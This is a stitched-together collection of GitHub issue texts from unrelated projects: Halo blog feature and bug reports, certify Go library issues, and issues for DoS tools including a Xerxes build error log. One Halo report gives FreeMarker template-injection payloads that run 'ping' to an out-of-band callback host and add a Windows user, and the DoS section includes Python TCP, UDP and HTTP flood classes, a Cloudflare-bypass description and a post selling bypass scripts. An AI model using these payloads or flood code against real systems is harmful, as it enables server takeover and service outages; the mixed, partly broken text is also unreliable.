- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [ ] BUG 反馈
- [x] 添加新的特性或者功能
- [ ] 请求技术支持
 我没有测试所有的markdown，但是一些希腊字母和数学公式（比如sum）就不支持
![image](https://user-images.githubusercontent.com/22809336/48827285-cb3e9e00-eda7-11e8-8aff-88a0fa259b44.png)
![image](https://user-images.githubusercontent.com/22809336/48827289-ced22500-eda7-11e8-9038-682c0c0610ea.png)
预览后：
![image](https://user-images.githubusercontent.com/22809336/48827298-d7c2f680-eda7-11e8-893f-dea87e0ddfbf.png)
![image](https://user-images.githubusercontent.com/22809336/48827306-db567d80-eda7-11e8-83f2-0c2122e3822a.png)
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://docs.halo.run/)
- [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/ruibaby/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [ ] BUG 反馈
- [x] 添加新的特性或者功能
- [ ] 请求技术支持

编辑器支持音乐视频 写文章如何录入摘要，背景图片？
我尝试了halo和后台和halo-admin的后台，写文章时是有标题和正文（markdown）两个字段，请问post的其他字段要如何录入，比如摘要，图片（缩略图）等等。

<img width="468" alt="2222222" src="https://user-images.githubusercontent.com/4928711/60329659-6396a400-99c3-11e9-917b-9e8f08d296b5.png">
<img width="610" alt="11111111" src="https://user-images.githubusercontent.com/4928711/60329660-642f3a80-99c3-11e9-865c-c1d000a56a67.png"> <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://docs.halo.run/)
- [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/ruibaby/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持



写文章的markdown编辑器，引用外部图片，图片无法显示。
比如： ![image](https://img2018.cnblogs.com/blog/1470456/201812/1470456-20181206183046416-842826862.jpg)

图片链接没有问题
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持
 
**我确定我已经查看了**

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持

删除主题后用户目录下对应的主题文件夹没有删除，导致不能再次导入主题。
手动删除也不行，停掉服务后文件夹自动消失。
在调试主题的时候需要不停地启/停服务，有点难受。 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [ ] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [ ] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持



配置好了阿里云OSS，但上传时是失败的。
![image](https://user-images.githubusercontent.com/40338580/58934037-cff2fe80-879b-11e9-91c1-7d3cd72ecec6.png)
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [ ] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持

如图：
![Screenshot from 2019-07-24 22-28-59](https://user-images.githubusercontent.com/5105709/61802088-7be2cd00-ae62-11e9-8ea9-9aa5fc6c88ea.png)
 
**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [ ] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

昨天使用docker方式部署halo，在安装过程中发现了docker会在启动后自动关闭，排查发现是因为docker中的应用连接不到数据库导致。但是在文档中未找到相关的说明。
 **我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [ ] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

昨天使用docker方式部署halo，在安装过程中发现了docker会在启动后自动关闭，排查发现是因为docker中的应用连接不到数据库导致。但是在文档中未找到相关的说明。
所以，需要在文档中做一下说明，如果是用docker方式，在application中关于数据库地址的配置需要调整成宿主机的访问ip才可以请求到。
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [ ] [Halo 使用文档](https://halo.run/docs)
- [ ] [Halo 论坛](https://bbs.halo.run)
- [ ] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [ x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x ] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持

# Testing environment

java version:1.8.0_181
os system: windows
server ip address:192.168.126.136

# Vulnerability Test

## Simple test
access address http://192.168.126.136:8090/admin/ and login in the backstage.Click exterior(外观) and select theme editor(主题编辑). Select any one of the template files,such as "page-top.ftl". Then edit the file and insert a template statement like this.

### payload-1
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ping ggggga.2xxxxxj.ceye.io") }
```

![image](https://github.com/c0d1007/exploit/blob/master/4.jpg)

Save the file and refresh home page,and then ceye platform can receive a message

![image](https://github.com/c0d1007/exploit/blob/master/1.jpg)

## Execute system command

also edit "page-top.ftl" to execute system command to add system user.

### payload-2
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("net user security security /add") }
```

![image](https://github.com/c0d1007/exploit/blob/master/2.jpg)

save the file again and refresh home page again.Then will add user in the system

![image](https://github.com/c0d1007/exploit/blob/master/3.jpg)

# Remark

Because the preview does not display the picture properly when editing the issus, you can visit my github project(https://github.com/c0d1007/exploit) and view the picture.

# Solution

Template files can only be edited locally, or check the file input
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [ x] [Halo 使用文档](https://halo.run/docs)
- [x ] [Halo 论坛](https://bbs.halo.run)
- [ x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x ] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x ] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持

如果自动生成的中文标题中包含“/”，发表的文章将无法访问并提示404，建议自动生成的标题按当前时间戳生成

  <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [x] BUG 反馈
- [ ] 添加新的特性或者功能
- [ ] 请求技术支持

配置信息如下
SMTP 地址：
smtp.exmail.qq.com
发送协议：
smtp
SSL 端口：
465
邮箱账号：

相同的设置在wordpress下可以发信

halo直接提示发信失败请检查smtp设置
<---------->
126387751
Had a quick look but couldn't find what Istio uses under the hood, but there are certs being issued so there should be an issuer somewhere! EJBCA is a certificate authority written in Java. It has a docker image (https://hub.docker.com/r/primekey/ejbca-ce) which should make testing simple. It appears to have a HTTP JSON REST API: https://doc.primekey.com/ejbca/ejbca-operations/ejbca-ca-concept-guide/protocols/ejbca-rest-interface. **Is your feature request related to a problem? Please describe.**
With current setup users of the library need to pull dependencies for all issuers even though most of them will only use a single one.

**Describe the solution you'd like**
Create a submodule per issuer, then every user will only have to pull dependencies for the issuer they are using.

**Additional context**
This is quite simple to do I've done it in this fork https://github.com/utilitywarehouse/certify, I can make a PR if you want, but it's probably easier to set this up when you have access to the repo.
After switching to my fork with submodules I got the following change in `go.sum` file in a module that's using cfssl issuer https://gist.github.com/SpeedyCoder/1d9e6216cd5fc877ea4cb059faadc220
(I also bumped dependencies, but the point is the number of lines removed...) This would allow users more control over the client creation. We should really publish a docker container for the certify proxy. This would allow users more control over the client creation. This means we can safely use HTTP connections as well as HTTPS. I am using certify in a sub-project and use dep to manage my dependencies.

**Steps to reproduce the bug**

I am running `dep ensure -update {sub-project}`

**Expected behavior**

My vendor folder contains certify and the updated sub-project.

**What happened instead**

The vendor folder contains in addition to the expected files:
* protoc-gen-go
* gingko
* moq
 We should really publish a docker container for the certify proxy. We're using dockertest at the moment, which doesn't support podman. Would be nice to be able to use either or. This is a repository-level issue that's causing a problem with our tooling.

This is output by the vscode static analysis tools as well as non-Go 1.11 module builds (within Gopath, with GO111MODULE=off/auto). The actual application builds on our CI because we use Go 1.11 modules for that. However, this breaks all intellisense features because every other issue is ignored and this is the only output:

```
cannot use caAuth (type *"github.com/cloudflare/cfssl/auth".Standard) as type "github.com/johanbrandhorst/certify/vendor/github.com/cloudflare/cfssl/auth".Provider in field value:
	*"github.com/cloudflare/cfssl/auth".Standard does not implement "github.com/johanbrandhorst/certify/vendor/github.com/cloudflare/cfssl/auth".Provider (wrong type for Verify method)
		have Verify(*"github.com/cloudflare/cfssl/auth".AuthenticatedRequest) bool
		want Verify(*"github.com/johanbrandhorst/certify/vendor/github.com/cloudflare/cfssl/auth".AuthenticatedRequest) bool
```

It's my understanding that vendor/ paths should not be used by library authors and only for end-user binaries.

Given that this project already specifies go.mod/go.sum for proper version management - it would make sense to simply remove the vendor directory to resolve these issues with vscode tooling. As right now, I think the only alternative is to run the static analysis tools manually and ignore vscode - which is pretty annoying! After reviewing https://github.com/johanbrandhorst/certify/pull/70 it was concluded that something like https://github.com/spiffe/go-spiffe could be used to validate that the `OtherSans` settings are parsed correctly. It might allow us to remove the go-spiffe dependency altogether since the logic is very similar. Had a quick look but couldn't find what Istio uses under the hood, but there are certs being issued so there should be an issuer somewhere! I am using certify in a sub-project and use dep to manage my dependencies.

**Steps to reproduce the bug**

I am running `dep ensure -update {sub-project}`

**Expected behavior**

My vendor folder contains certify and the updated sub-project.

**What happened instead**

The vendor folder contains in addition to the expected files:
* protoc-gen-go
* gingko
* moq
 This repo is a good candidate for trying out go modules as it doesn't have a v1 yet. It is the way of the future so there's no good reason not to do it. Note current best practices on tool dependencies (for `moq`, `protoc-gen-go`, `ginkgo`): https://github.com/golang/go/wiki/Modules#how-can-i-track-tool-dependencies-for-a-module The generate CI check was disabled with #25 because of issues surrounding `moq`. See https://github.com/matryer/moq/issues/84#issuecomment-457872661 for more information. This might not be possible, but would be good to investigate. Should be possible, but will need some research. https://aws.amazon.com/certificate-manager/private-certificate-authority/ **Describe the bug**

We have services that health check every 15 seconds, These result in a call to certify to get the service certificate. Whenever this happens there are 2 log messages written to debug output, one saying that certify is getting the certificate and one saying it is successful.

This fills the logs with certify entries getting in the way of seeing the real service logs

**Steps to reproduce the bug**

Use certify to provide a certificate, every call to certify.GetCertificate results in these log entries

**Expected behavior**

Log entries should only occur if a new certificate is being requested or if there is an error, default "happy path" behaviour should not result in these logs

**What happened instead**

Lots of log messages observed

**Additional context**

<---------->
126474046
**Is your feature request related to a problem? Please describe.**
A clear and concise description of what the problem is. Ex. I'm always frustrated when [...]

**Describe the solution you'd like**
A clear and concise description of what you want to happen.

**Describe alternatives you've considered**
A clear and concise description of any alternative solutions or features you've considered.

**Additional context**
Add any other context or screenshots about the feature request here.
 This Denial Of Service suite comprises of the following features :

CloudBust :- Cloudbust a.k.a AETHON is a cloudflare resolver that looks into the cloudflare protected website for misconfigured DNS configuration basically uses dnsdumpster.com as its resolver :)and identifies the backend IP of the website. We will add more updates in upcoming time.

HTTP Flood :- HTTP Flood is a type of Denial of Service attack in which the attacker manipulates HTTP and POST unwanted requests in order to attack a web server or application. In an HTTP flood, the HTTP clients such as web browser interact with an application
or server to send HTTP requests. The aim of the attack is when to compel the server to allocate as many resources as possible to serving the attack thus denying legitimate users access to the server's resources. ALISA is a http d.o.s tool written in such a way to suck all of the website's resources and is a layer 7 D.O.S tool.

TCP SYN Flood :- A SYN flood is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in
an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.

UDP Flood :- A UDP flood attack is a denial-of-service (DoS) attack using the User Datagram Protocol (UDP), a sessionless/connectionless computer networking protocol. class tcpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.tcp     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass
 
class udpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.udp     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

class httpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.http     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.http.sendto(bytes,(self.ip, self.port))
            except:


                pass

class httpsFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.https     = threading.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                threading(self.ip, self.port)
                threading(0)
                threading(bytes,(self.ip, self.port))
            except:
                pass I clone the repository and i navigate to the folder but the response is
bash: ./Xerxes: No such file or directory
  Selling CloudFlare Bypass Scripts! I Accept only BTC ! My Discord: Nite Max#0293

https://www.youtube.com/watch?v=jK_lbn4HZZw 

$5 Bitcoin 

buy the script ( and decompile with this coordination ) 


inordinate 

1.1.1.1/24 80 10 
            . _..::__:  ,-"-"._        |7       ,     _,.__
   _.___ _ _<_>`!(._`.`-.    /         _._     `_ ,_/  '  '-._.---.-.__
>.{     " " `-==,',._\{  \  / {)      / _ ">_,-' `                mt-2_
  \_.:--.       `._ )`^-. "'       , [_/(                       __,/-'
 '"'     \         "    _L        oD_,--'                )     /. (|
          |           ,'          _)_.\\._<> 6              _,' /  '
          `.         /           [_/_'` `"(                <'}  )
           \\    .-. )           /   `-'"..' `:.#          _)  '
    `        \  (  `(           /         `:\  > \  ,-^.  /' '
              `._,   ""         |           \`'   \|   ?_)  {\
                 `=.---.        `._._       ,'     "`  |' ,- '.
                   |    `-._         |     /          `:`<_|h--._
                   (        >        .     | ,          `=.__.`-'\
                    `.     /         |     |{|              ,-.,\     .
                     |   ,'           \   / `'            ,"     \
                     |  /              |_'                |  __  /
                     | |                                  '-'  `-'   \.
                     |/                                         "    /
                     \.                                             '
"""     
      hi，i  am git clone --recursive    ........Xerxes  this project。

There was a mistake， when i  execute   make command   。
Please give me a hand. Thank you.

[root@app ~]# 
**[root@app ~]# cd Xerxes**
[root@app Xerxes]# dir
bash-completion  build	CMake  CMakeLists.txt  Dockerfile  img	include  lib  LICENSE.md  man  README.md  src  useragents
[root@app Xerxes]# cd build
**[root@app build]# cmake3 ..**
**-- Build type: Release
-- Version: 5.3.1
-- Build type: Release
-- CXX_STANDARD: 17
-- Configuring done
-- Generating done
-- Build files have been written to: /root/Xerxes/build**
**[root@app build]# make**
[  0%] Built target fmt
[ 88%] Built target crypto
[ 96%] Built target ssl
[ 98%] Built target tls
_[ 98%] [34m[1mPrecompiling stdafx.hpp for Xerxes (C++)[0m
In file included from [01m[K/usr/include/c++/4.8.2/cstdint:35:0[m[K,
                 from [01m[K/root/Xerxes/lib/fmt/include/fmt/format.h:34[m[K,
                 from [01m[K/root/Xerxes/lib/fmt/include/fmt/color.h:11[m[K,
                 from [01m[K/root/Xerxes/build/Xerxes_pch/include/stdafx.hpp:5[m[K:_
[01m[K/usr/include/c++/4.8.2/bits/c++0x_warning.h:32:2:[m[K [01;31m[Kerror: [m[K#error This file requires compiler and library support for the ISO C++ 2011 standard. This support is currently experimental, and must be enabled with the -std=c++11 or -std=gnu++11 compiler options.
 #error This file requires compiler and library support for the \
[01;32m[K  ^[m[K
In file included from [01m[K/root/Xerxes/lib/fmt/include/fmt/format.h:60:0[m[K,
                 from [01m[K/root/Xerxes/lib/fmt/include/fmt/color.h:11[m[K,
                 from [01m[K/root/Xerxes/build/Xerxes_pch/include/stdafx.hpp:5[m[K:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:238:15:[m[K [01;31m[Kerror: [m[K‘[01m[Kadd_rvalue_reference[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 typename std::add_rvalue_reference<T>::type declval() FMT_NOEXCEPT;
[01;32m[K               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:238:35:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
 typename std::add_rvalue_reference<T>::type declval() FMT_NOEXCEPT;
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:249:31:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename F, typename... Args>
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:250:24:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 struct result_of<F(Args...)>
[01;32m[K                        ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:251:21:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
     : std::result_of<typename std::remove_reference<F>::type(Args...)> {};
[01;32m[K                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:251:21:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:251:21:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:256:29:[m[K [01;31m[Kerror: [m[K‘[01m[Kmake_unsigned[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 FMT_CONSTEXPR typename std::make_unsigned<Int>::type to_unsigned(Int value) {
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:256:42:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
 FMT_CONSTEXPR typename std::make_unsigned<Int>::type to_unsigned(Int value) {
[01;32m[K                                          ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:264:27:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   buffer(const buffer&) = delete;
[01;32m[K                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:265:35:[m[K [01;35m[Kwarning: [m[Kdefaulted and deleted functions only available with -std=c++11 or -std=gnu++11 [enabled by default]
   void operator=(const buffer&) = delete;
[01;32m[K                                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:385:19:[m[K [01;35m[Kwarning: [m[Kvariadic templates only available with -std=c++11 or -std=gnu++11 [enabled by default]
 template <typename... T>
[01;32m[K                   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:386:48:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
 struct is_constructible : std::is_constructible<T...> {};
[01;32m[K                                                ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:386:48:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:386:48:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In function ‘[01m[Kfmt::v5::basic_string_view<Char> fmt::v5::to_string_view(const std::basic_string<_CharT, _Traits, _Alloc>&)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:511:3:[m[K [01;35m[Kwarning: [m[Kextended initializer lists only available with -std=c++11 or -std=gnu++11 [enabled by default]
   return {s.data(), s.size()};
[01;32m[K   ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:531:43:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
 struct is_compile_string : std::is_base_of<compile_string, S> {};
[01;32m[K                                           ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:531:43:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:531:43:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:44:[m[K [01;31m[Kerror: [m[K‘[01m[Kenable_if[m[K’ in namespace ‘[01m[Kstd[m[K’ does not name a type
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:533:23:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename S, FMT_ENABLE_IF(is_compile_string<S>::value)>
[01;32m[K                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:230:53:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K>[m[K’ before ‘[01m[K<[m[K’ token
 #define FMT_ENABLE_IF_T(...) typename std::enable_if<(__VA_ARGS__), int>::type
[01;32m[K                                                     ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:231:28:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF_T[m[K’
 #define FMT_ENABLE_IF(...) FMT_ENABLE_IF_T(__VA_ARGS__) = 0
[01;32m[K                            ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:533:23:[m[K [01;36m[Knote: [m[Kin expansion of macro ‘[01m[KFMT_ENABLE_IF[m[K’
 template <typename S, FMT_ENABLE_IF(is_compile_string<S>::value)>
[01;32m[K                       ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K In member function ‘[01m[Kvoid fmt::v5::basic_parse_context<Char, ErrorHandler>::advance_to(fmt::v5::basic_parse_context<Char, ErrorHandler>::iterator)[m[K’:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:566:31:[m[K [01;31m[Kerror: [m[K‘[01m[Kto_unsigned[m[K’ is not a member of ‘[01m[Kfmt::v5::internal[m[K’
     format_str_.remove_prefix(internal::to_unsigned(it - begin()));
[01;32m[K                               ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:[m[K At global scope:
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:607:29:[m[K [01;31m[Kerror: [m[Kexpected template-name before ‘[01m[K<[m[K’ token
     : std::integral_constant<bool, !std::is_arithmetic<T>::value &&
[01;32m[K                             ^[m[K
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:607:29:[m[K [01;31m[Kerror: [m[Kexpected ‘[01m[K{[m[K’ before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:607:29:[m[K [01;31m[Kerror: [m[Kexpected unqualified-id before ‘[01m[K<[m[K’ token
[01m[K/root/Xerxes/lib/fmt/include/fmt/core.h:612:67:[m[K [01;31m[Kerror: [m[Kexpected class-name before ‘[01m[K{[m[K’ token
 template <typename T> struct no_formatter_error : std::false_type {};
[01;32m[K                                                                   ^[m[K
